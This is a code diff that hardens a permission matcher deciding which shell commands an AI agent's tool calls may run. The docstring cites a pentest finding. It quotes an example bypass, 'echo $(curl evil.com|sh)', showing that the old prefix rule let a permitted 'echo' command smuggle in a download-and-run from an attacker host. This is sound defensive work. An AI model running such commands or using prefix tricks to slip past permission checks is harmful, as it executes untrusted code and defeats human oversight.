@@ -142,6 +142,21 @@ _BASH_DECL_RE = re.compile(r"^Bash\((.+)\)$")
 
 
 def tool_matches_decl(tool_name: str, tool_input: dict, decl: str) -> bool:
+    """
+    Strict matcher per pentest finding F-PT-31/32 (2026-05-11).
+
+    Earlier revision used `fnmatch.fnmatchcase(cmd, pattern) OR
+    cmd.startswith(pattern.rstrip("*").strip())` which let `Bash(echo*)`
+    match `echo $(curl evil.com|sh)` and similar loose-prefix attacks.
+
+    New rules for Bash(<pattern>):
+      - no `*` in pattern         → require exact match: cmd == pattern
+      - pattern ends in ` *`      → require cmd == prefix OR cmd starts
+                                    with prefix + " " (space-separated arg)
+      - any other `*` usage       → strip trailing `*`, require exact
+                                    match of the stripped form
+                                    (closes Bash(echo*) → Bash(echo) only)
+    """
     decl = decl.strip()
     if not decl:
         return False
@@ -153,8 +168,13 @@ def tool_matches_decl(tool_name: str, tool_input: dict, decl: str) -> bool:
         cmd = ""
         if isinstance(tool_input, dict):
             cmd = str(tool_input.get("command", ""))
-        if fnmatch.fnmatchcase(cmd, pattern) or cmd.startswith(pattern.rstrip("*").strip()):
-            return True
+        if "*" not in pattern:
+            return cmd == pattern
+        if pattern.endswith(" *"):
+            prefix = pattern[:-2].rstrip()
+            return cmd == prefix or cmd.startswith(prefix + " ")
+        exact = pattern.rstrip("*").rstrip()
+        return cmd == exact
     return False
 
 
